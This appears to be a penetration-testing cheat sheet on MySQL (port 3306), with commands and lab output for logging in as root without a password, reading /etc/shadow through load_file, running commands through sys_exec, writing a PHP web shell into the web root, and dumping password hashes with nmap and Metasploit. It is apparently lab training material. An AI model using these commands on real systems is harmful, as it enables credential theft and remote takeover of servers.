---
description: MySQL is a very popular open-source relational database management system.
---

# 3306 - MySQL

## Connecting 

Connect using one of the following options: 

1. mysql client \(builtin in Kali\) 
2.  metasploit \(mysql\_login\) 

### mysql client:

`mysql -h 192.102.118.3 -u root`

## Basic Commands

**show databases:** 

```text
MySQL [(none)]> show databases; 
+--------------------+ 
| Database           | 
+--------------------+ 
| information_schema | 
| books              | 
| data               | 
| mysql              | 
| password           | 
| performance_schema | 
| secret             | 
| store              | 
| upload             | 
| vendors            | 
| videos             | 
+--------------------+ 
11 rows in set (0.001 sec) 
MySQL [(none)]>  
```

**display tables**: 

```text
MySQL [books]> show tables; 
+-----------------+ 
| Tables_in_books | 
+-----------------+ 
| authors         | 
+-----------------+ 
count columns: 
MySQL [books]> SELECT count(*) FROM authors; 
+----------+ 
| count(*) | 
+----------+ 
|       10 | 
+----------+ 
1 row in set (0.001 sec) 
```

**load file:** 

```text
MySQL [(none)]> select load_file("/etc/shadow"); 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
| load_file("/etc/shadow")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      | 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
| root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUI3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7::: 
daemon:*:17850:0:99999:7::: 
bin:*:17850:0:99999:7::: 
sys:*:17850:0:99999:7::: 
sync:*:17850:0:99999:7::: 
games:*:17850:0:99999:7::: 
man:*:17850:0:99999:7::: 
lp:*:17850:0:99999:7::: 
mail:*:17850:0:99999:7::: 
news:*:17850:0:99999:7::: 
uucp:*:17850:0:99999:7::: 
proxy:*:17850:0:99999:7::: 
www-data:*:17850:0:99999:7::: 
backup:*:17850:0:99999:7::: 
list:*:17850:0:99999:7::: 
irc:*:17850:0:99999:7::: 
gnats:*:17850:0:99999:7::: 
nobody:*:17850:0:99999:7::: 
libuuid:!:17850:0:99999:7::: 
syslog:*:17850:0:99999:7::: 
mysql:!:17857:0:99999:7::: 
dbadmin:$6$vZ3Fv3x6$qdB/lOAC1EtkdbQKpHEp/BkVMQD2C2AFPkYW3.W7jMlMbl5.:17861:0:99999:7::: 
 | 
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+ 
1 row in set (0.000 sec) 
```

## Command execution

If mysql is running as root you can run commands by typing: 

`select sys_exec('whoami');` 

`select sys_eval('whoami');` 

```text
select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/var/www/html/this-is-my-shell.php'
```



## Enumeration

### Nmap 

#### Nmap scripts

```text
root@attackdefense:~# ls /usr/share/nmap/scripts/*mysql* 
/usr/share/nmap/scripts/mysql-audit.nse 
/usr/share/nmap/scripts/mysql-dump-hashes.nse 
/usr/share/nmap/scripts/mysql-info.nse 
/usr/share/nmap/scripts/mysql-variables.nse 
/usr/share/nmap/scripts/mysql-brute.nse 
/usr/share/nmap/scripts/mysql-empty-password.nse 
/usr/share/nmap/scripts/mysql-query.nse 
/usr/share/nmap/scripts/mysql-vuln-cve2012-2122.nse 
/usr/share/nmap/scripts/mysql-databases.nse 
/usr/share/nmap/scripts/mysql-enum.nse 
/usr/share/nmap/scripts/mysql-users.nse
```

####  User enumeration:

```text
root@attackdefense:~# nmap -p 3306 192.102.118.3 --script mysql-enum 
Starting Nmap 7.70 ( 
https://nmap.org
 ) at 2019-11-04 16:22 UTC 
Nmap scan report for target-1 (192.102.118.3) 
Host is up (0.000059s latency). 
 
PORT     STATE SERVICE 
3306/tcp open  mysql 
| mysql-enum:  
|   Valid usernames:  
|     root:<empty> - Valid credentials 
|     user:<empty> - Valid credentials 
|     web:<empty> - Valid credentials 
|     guest:<empty> - Valid credentials 
|     test:<empty> - Valid credentials 
|     sysadmin:<empty> - Valid credentials 
|     administrator:<empty> - Valid credentials 
|     webadmin:<empty> - Valid credentials 
|     admin:<empty> - Valid credentials 
|     netadmin:<empty> - Valid credentials 
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0 
MAC Address: 02:42:C0:66:76:03 (Unknown) 
```

#### dump hashes

```text
root@attackdefense:~# nmap -p 3306 192.102.118.3 --script mysql-dump-hashes.nse --script-args='username=root,password=' 
Starting Nmap 7.70 ( 
https://nmap.org
 ) at 2019-11-04 16:33 UTC 
Nmap scan report for target-1 (192.102.118.3) 
Host is up (0.000060s latency). 
 
PORT     STATE SERVICE 
3306/tcp open  mysql 
| mysql-dump-hashes:  
|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D 
|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B 
|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0 
|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646 
|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0 
|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9 
|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14 
MAC Address: 02:42:C0:66:76:03 (Unknown) 
 
Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds 
```

### Metasploit

#### Modules:

```text
msf5 > search mysql 

Matching Modules 
================ 
   #   Name                                                  Disclosure Date  Rank       Check  Description 
   -   ----                                                  ---------------  ----       -----  ----------- 
   1   auxiliary/admin/http/manageengine_pmp_privesc         2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection 
   2   auxiliary/admin/http/rails_devise_pass_reset          2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset 
   3   auxiliary/admin/mysql/mysql_enum                                       normal     No     MySQL Enumeration Module 
   4   auxiliary/admin/mysql/mysql_sql                                        normal     No     MySQL SQL Generic Query 
   5   auxiliary/admin/tikiwiki/tikidblib                    2006-11-01       normal     No     TikiWiki Information Disclosure 
   6   auxiliary/analyze/jtr_mysql_fast                                       normal     No     John the Ripper MySQL Password Cracker (Fast Mode) 
   7   auxiliary/gather/joomla_weblinks_sqli                 2014-03-02       normal     Yes    Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read 
   8   auxiliary/scanner/mysql/mysql_authbypass_hashdump     2012-06-09       normal     Yes    MySQL Authentication Bypass Password Dump 
   9   auxiliary/scanner/mysql/mysql_file_enum                                normal     Yes    MYSQL File/Directory Enumerator 
   10  auxiliary/scanner/mysql/mysql_hashdump                                 normal     Yes    MYSQL Password Hashdump 
   11  auxiliary/scanner/mysql/mysql_login                                    normal     Yes    MySQL Login Utility 
   12  auxiliary/scanner/mysql/mysql_schemadump                               normal     Yes    MYSQL Schema Dump 
   13  auxiliary/scanner/mysql/mysql_version                                  normal     Yes    MySQL Server Version Enumeration 
   14  auxiliary/scanner/mysql/mysql_writable_dirs                            normal     Yes    MYSQL Directory Write Test 
   15  auxiliary/server/capture/mysql                                         normal     No     Authentication Capture: MySQL 
   16  exploit/linux/mysql/mysql_yassl_getname               2010-01-25       good       No     MySQL yaSSL CertDecoder::GetName Buffer Overflow 
   17  exploit/linux/mysql/mysql_yassl_hello                 2008-01-04       good       No     MySQL yaSSL SSL Hello Message Buffer Overflow 
   18  exploit/multi/http/manage_engine_dc_pmp_sqli          2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection 
   19  exploit/multi/http/zpanel_information_disclosure_rce  2014-01-30       excellent  No     Zpanel Remote Unauthenticated RCE 
   20  exploit/multi/mysql/mysql_udf_payload                 2009-01-16       excellent  No     Oracle MySQL UDF Payload Execution 
   21  exploit/unix/webapp/kimai_sqli                        2013-05-21       average    Yes    Kimai v0.9.2 'db_restore.php' SQL Injection 
   22  exploit/unix/webapp/wp_google_document_embedder_exec  2013-01-03       normal     Yes    WordPress Plugin Google Document Embedder Arbitrary File Disclosure 
   23  exploit/windows/mysql/mysql_mof                       2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution 
   24  exploit/windows/mysql/mysql_start_up                  2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse 
   25  exploit/windows/mysql/mysql_yassl_hello               2008-01-04       average    No     MySQL yaSSL SSL Hello Message Buffer Overflow 
   26  exploit/windows/mysql/scrutinizer_upload_exec         2012-07-27       excellent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Credential 
   27  post/linux/gather/enum_configs                                         normal     No     Linux Gather Configurations 
   28  post/linux/gather/enum_users_history                                   normal     No     Linux Gather User History 
   29  post/multi/manage/dbvis_add_db_admin                                   normal     No     Multi Manage DbVisualizer Add Db Admin 
```

#### Enumerate directories:

```text
msf5 auxiliary(scanner/mysql/mysql_file_enum) > show options  

Module options (auxiliary/scanner/mysql/mysql_file_enum): 
 
   Name           Current Setting  Required  Description 
   ----           ---------------  --------  ----------- 
   DATABASE_NAME  mysql            yes       Name of database to use 
   FILE_LIST                       yes       List of directories to enumerate 
   PASSWORD                        no        The password for the specified username 
   RHOSTS         192.102.118.3    yes       The target address range or CIDR identifier 
   RPORT          3306             yes       The target port (TCP) 
   TABLE_NAME     RxJwRpLp         yes       Name of table to use - Warning, if the table already exists its contents will be corrupted 
   THREADS        1                yes       The number of concurrent threads 
   USERNAME       root             yes       The username to authenticate as  
msf5 auxiliary(scanner/mysql/mysql_file_enum) > set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt 
FILE_LIST => /usr/share/metasploit-framework/data/wordlists/directory.txt 
msf5 auxiliary(scanner/mysql/mysql_file_enum) > run 
 
[+] 192.102.118.3:3306    - /tmp is a directory and exists 
[+] 192.102.118.3:3306    - /etc/passwd is a file and exists 
[+] 192.102.118.3:3306    - /etc/shadow is a file and exists 
[+] 192.102.118.3:3306    - /root is a directory and exists 
[+] 192.102.118.3:3306    - /home is a directory and exists 
[+] 192.102.118.3:3306    - /etc is a directory and exists 
[+] 192.102.118.3:3306    - /etc/hosts is a file and exists 
[+] 192.102.118.3:3306    - /usr/share is a directory and exists 
[+] 192.102.118.3:3306    - /etc is a directory and exists 
[*] 192.102.118.3:3306    - Scanned 1 of 1 hosts (100% complete) 
[*] Auxiliary module execution completed 
msf5 auxiliary(scanner/mysql/mysql_file_enum) >  
 
```



